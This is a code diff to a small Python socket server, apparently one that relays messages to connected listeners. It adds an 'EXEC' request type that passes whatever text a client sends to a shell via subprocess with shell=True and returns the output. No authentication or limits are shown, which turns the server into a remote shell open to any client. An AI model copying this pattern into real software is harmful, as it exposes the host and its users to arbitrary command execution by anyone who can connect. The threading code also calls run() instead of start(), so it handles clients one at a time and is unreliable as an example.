@@ -2,9 +2,14 @@ import socket
 import ssl
 import threading
 import utils
+import subprocess
 
 # list with all active listeners
 clients = []
+
+
+def exec(client: socket.socket, command: str):
+    utils.send(client, subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode('utf8'))
 
 
 def serve_client(client, addr, req):
@@ -25,6 +30,10 @@ def serve_client(client, addr, req):
                 # socket closed; remove it from listeners
                 print('Removing listener', addr[0])
                 clients.remove(c)
+    elif req.startswith('EXEC'):
+        comm = req[4:]
+        print('Executing command "', comm, '" from ', addr[0], sep='')
+        exec(client, comm)
 
 
 def start_server(port):
@@ -48,12 +57,12 @@ def start_server(port):
             break
 
         # handle client in another thread
-        t = threading.Thread(target=serve_client, args=(conn, addr, req))
-        t.run()
+        threading.Thread(target=serve_client, args=(conn, addr, req)).run()
 
     print('Shutting down server...')
     # close connection with all listeners
     for c in clients:
+        utils.send(c, 'Server is shutting down...')
         utils.send(c, 'STOP')
         c.close()
     sock.close()
